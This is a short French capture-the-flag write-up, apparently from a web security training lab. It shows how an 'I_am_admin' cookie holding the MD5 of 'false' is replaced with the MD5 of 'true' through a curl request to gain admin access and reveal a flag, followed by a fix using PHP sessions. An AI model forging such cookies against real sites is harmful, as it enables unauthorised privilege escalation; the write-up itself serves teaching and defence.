# Cookie Injection

## Exploitation

On voit que l'on a un Cookie :

`Cookie: I_am_admin=68934a3e9455fa72420237eb05902327`

si on fait un MD5 reverse, on obtient `false`

https://md5.gromweb.com/?md5=68934a3e9455fa72420237eb05902327

On le change par `true`

```bash
$> echo -n 'true' | md5sum
b326b5062b2f0e69046810717534cb09
```

On remplace notre cookie par cette valeur:

```bash
curl 'http://192.168.99.100/' \
 -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' | grep Flag

<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>
```

## Resolution

Il ne faut jamais mettre d'info sensible dans un cookie. En PHP, on peut utiliser une session pour stocker ce genre de donnée, ça donnerait;

```php
<?php
$_SESSION["I_am_admin"] = true;
?>
```
